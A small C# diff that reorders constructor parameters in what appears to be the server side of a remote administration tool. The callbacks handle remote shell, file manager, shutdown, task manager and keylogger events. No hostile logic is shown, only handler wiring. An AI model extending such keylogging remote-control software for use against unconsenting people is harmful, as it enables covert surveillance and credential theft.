@@ -21,11 +21,11 @@ namespace Server.Networking
                              Action<RemoteShellResponse> onRemoteShellResponse, 
                              Action<FileManagerResponse> onFileManagerResponse, 
                              Action<MessageBoxResponse> onMessageBoxResponse, 
-                             Action<ShutdownActionResponse> onShutdownActionResponse, 
-                             Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
+                             Action<ShutdownActionResponse> onShutdownActionResponse,
+							 Action<TaskManagerResponse> onTaskManagerResponse,
+							 Action<KeyLoggerEvent>? onKeyLoggerEvent = null, 
                              Action<KeyLoggerBatch>? onKeyLoggerBatch = null, 
-                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null,
-                             Action<TaskManagerResponse> onTaskManagerResponse)
+                             Action<KeyLoggerComboEvent>? onKeyLoggerComboEvent = null)
         {
             _onSystemInfoResponse = onSystemInfoResponse;
             _onRemoteShellResponse = onRemoteShellResponse;
